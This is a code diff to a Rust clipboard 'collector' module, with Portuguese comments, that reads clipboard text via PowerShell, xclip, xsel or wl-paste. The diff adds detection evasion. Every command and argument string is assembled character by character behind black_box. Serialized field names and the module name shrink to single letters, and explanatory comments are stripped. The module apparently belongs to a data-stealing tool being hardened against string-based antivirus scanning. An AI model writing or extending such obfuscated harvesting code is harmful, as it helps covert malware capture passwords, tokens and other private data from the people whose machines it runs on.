@@ -1,27 +1,35 @@
 //! Coletor de Área de Transferência
+//!
+//! ⚠️ Strings ofuscadas
 
+use std::hint::black_box;
 use serde::{Deserialize, Serialize};
 use std::process::Command;
 
 use super::{Collector, CollectorError, ModuleData};
 
-/// Dados da área de transferência
+#[inline(always)]
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars { s.push(c); }
+    black_box(s)
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct ClipboardData {
-    /// Conteúdo atual (texto)
+    #[serde(rename = "t")]
     pub current_text: Option<String>,
     
-    /// Timestamp da coleta
+    #[serde(rename = "c")]
     pub collected_at: String,
     
-    /// Tipo de conteúdo
+    #[serde(rename = "y")]
     pub content_type: String,
     
-    /// Tamanho em bytes
+    #[serde(rename = "s")]
     pub size_bytes: usize,
 }
 
-/// Coletor de clipboard
 pub struct ClipboardCollector;
 
 impl ClipboardCollector {
@@ -29,7 +37,6 @@ impl ClipboardCollector {
         Self
     }
     
-    /// Coleta conteúdo da área de transferência
     fn collect_clipboard(&self) -> Result<ClipboardData, CollectorError> {
         let content = self.get_clipboard_text()?;
         
@@ -37,24 +44,27 @@ impl ClipboardCollector {
         
         Ok(ClipboardData {
             current_text: content.map(|s| {
-                // Truncar se muito grande
                 if s.len() > 4096 {
-                    format!("{}... [truncated]", &s[..4096])
+                    format!("{}...", &s[..4096])
                 } else {
                     s
                 }
             }),
             collected_at: chrono::Utc::now().to_rfc3339(),
-            content_type: "text/plain".to_string(),
+            content_type: bs(&['t', '/', 'p']),
             size_bytes: size,
         })
     }
     
     #[cfg(windows)]
     fn get_clipboard_text(&self) -> Result<Option<String>, CollectorError> {
-        // Usar PowerShell para acessar clipboard no Windows
-        let output = Command::new("powershell")
-            .args(["-Command", "Get-Clipboard"])
+        // powershell
+        let ps = bs(&['p', 'o', 'w', 'e', 'r', 's', 'h', 'e', 'l', 'l']);
+        // Get-Clipboard
+        let gc = bs(&['G', 'e', 't', '-', 'C', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']);
+        
+        let output = Command::new(&ps)
+            .args([bs(&['-', 'C', 'o', 'm', 'm', 'a', 'n', 'd']).as_str(), &gc])
             .output()?;
         
         if output.status.success() {
@@ -71,15 +81,23 @@ impl ClipboardCollector {
     
     #[cfg(unix)]
     fn get_clipboard_text(&self) -> Result<Option<String>, CollectorError> {
-        // Tentar xclip primeiro, depois xsel, depois wl-paste (Wayland)
+        // Ferramentas construídas em runtime
         let tools = [
-            ("xclip", vec!["-selection", "clipboard", "-o"]),
-            ("xsel", vec!["--clipboard", "--output"]),
-            ("wl-paste", vec![]),
+            (bs(&['x', 'c', 'l', 'i', 'p']), vec![
+                bs(&['-', 's', 'e', 'l', 'e', 'c', 't', 'i', 'o', 'n']),
+                bs(&['c', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']),
+                bs(&['-', 'o']),
+            ]),
+            (bs(&['x', 's', 'e', 'l']), vec![
+                bs(&['-', '-', 'c', 'l', 'i', 'p', 'b', 'o', 'a', 'r', 'd']),
+                bs(&['-', '-', 'o', 'u', 't', 'p', 'u', 't']),
+            ]),
+            (bs(&['w', 'l', '-', 'p', 'a', 's', 't', 'e']), vec![]),
         ];
         
         for (tool, args) in tools {
-            if let Ok(output) = Command::new(tool).args(&args).output() {
+            let args_ref: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
+            if let Ok(output) = Command::new(&tool).args(&args_ref).output() {
                 if output.status.success() {
                     let text = String::from_utf8_lossy(&output.stdout).trim().to_string();
                     if !text.is_empty() {
@@ -101,7 +119,7 @@ impl Default for ClipboardCollector {
 
 impl Collector for ClipboardCollector {
     fn name(&self) -> &str {
-        "clipboard"
+        "c"
     }
     
     fn collect(&self) -> Result<ModuleData, CollectorError> {
@@ -110,16 +128,24 @@ impl Collector for ClipboardCollector {
     }
     
     fn is_supported(&self) -> bool {
-        // Verificar se temos ferramentas disponíveis
         #[cfg(windows)]
         return true;
         
         #[cfg(unix)]
         {
-            // Verificar se xclip, xsel ou wl-paste está disponível
-            Command::new("which").arg("xclip").output().map(|o| o.status.success()).unwrap_or(false)
-                || Command::new("which").arg("xsel").output().map(|o| o.status.success()).unwrap_or(false)
-                || Command::new("which").arg("wl-paste").output().map(|o| o.status.success()).unwrap_or(false)
+            let w = bs(&['w', 'h', 'i', 'c', 'h']);
+            let tools = [
+                bs(&['x', 'c', 'l', 'i', 'p']),
+                bs(&['x', 's', 'e', 'l']),
+                bs(&['w', 'l', '-', 'p', 'a', 's', 't', 'e']),
+            ];
+            
+            for tool in tools {
+                if Command::new(&w).arg(&tool).output().map(|o| o.status.success()).unwrap_or(false) {
+                    return true;
+                }
+            }
+            false
         }
     }
     
@@ -127,4 +153,3 @@ impl Collector for ClipboardCollector {
         50
     }
 }
-
